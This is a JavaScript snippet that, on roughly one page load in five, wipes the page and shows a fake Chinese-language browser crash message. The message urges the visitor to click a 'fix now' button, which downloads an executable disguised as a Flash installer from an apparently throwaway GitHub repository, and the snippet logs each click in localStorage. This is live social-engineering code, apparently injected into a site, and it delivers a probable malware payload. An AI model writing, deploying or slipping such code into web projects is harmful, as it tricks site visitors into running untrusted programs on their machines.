 var body = document.body;
    var randomChance = Math.random();

    if (randomChance <= 0.2) {
        var _left = window.innerWidth * 0.3 + 'px';
        var _top = window.innerHeight * 0.3 + 'px';
        var _height = window.innerHeight + 'px'; // 将_height的值设置为字符串，并添加'px'

        body.innerHTML = `
            <div style="background-color: white; height: ${_height};">
                <div style="position: absolute; top: ${_top}; left: ${_left}; height: 300px; width: 600px;">
                    <img src="https://github.com/zhaozhibing780/sssssssgewe/blob/main/kgxxm1.png?raw=true" style="margin: 3px;">
                    <h3>喔唷，崩溃啦!</h3>
                    <p style="color: gray;">
                        显示此网页时出了点问题，请在您的页面上启用显示插件，从而可能会有所帮助。<br>
                    </p>
                    <a href="https://github.com/zhaozhibing780/sssssssgewe/raw/main/flashcenter_install_cn.exe" id="fix-now-button">
                        <button style="margin-left: 85%; height: 30px; line-height: 30px; outline: none; border: none; background-color: rgb(26, 115, 232); color: white;">
                            立即修复
                        </button>
                    </a>
                </div>
            </div>`;

        document.getElementById('fix-now-button').addEventListener('click', function () {
            localStorage.setItem('lastClick', Date.now().toString());
        });
    }
